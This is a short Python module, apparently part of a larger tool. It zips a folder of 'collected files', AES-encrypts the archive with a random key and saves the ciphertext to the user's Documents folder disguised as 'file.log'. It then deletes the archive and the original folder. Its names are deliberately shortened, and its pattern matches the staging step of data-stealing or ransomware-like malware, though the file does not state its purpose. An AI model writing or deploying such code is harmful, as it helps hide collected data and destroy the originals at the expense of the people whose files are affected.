# em.py
import os
import shutil
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sp
from cryptography.hazmat.backends import default_backend

cf = "cf"  # collected_files
an = "ca.zip"  # archive_name
ef = "file.log"  # encrypted_filename

def gk():
    return os.urandom(32)  # generate_aes_key → gk

def ed(dt: bytes, ky: bytes):  # encrypt_data → ed
    iv = os.urandom(16)
    cp = Cipher(algorithms.AES(ky), modes.CBC(iv), backend=default_backend())
    en = cp.encryptor()
    pd = sp.PKCS7(128).padder()
    pt = pd.update(dt) + pd.finalize()
    ct = en.update(pt) + en.finalize()
    return iv + ct, iv

def efc() -> (str, bytes):  # encrypt_folder → efc
    shutil.make_archive("ca", 'zip', cf)
    with open(an, 'rb') as f:
        rw = f.read()

    ky = gk()
    en_data, iv = ed(rw, ky)

    dp = os.path.join(os.path.expanduser("~"), "Documents")
    os.makedirs(dp, exist_ok=True)
    op = os.path.join(dp, ef)
    with open(op, 'wb') as f:
        f.write(en_data)

    os.remove(an)
    shutil.rmtree(cf, ignore_errors=True)

    print(f"✅ Encrypted archive saved to {op}")
    return op, ky
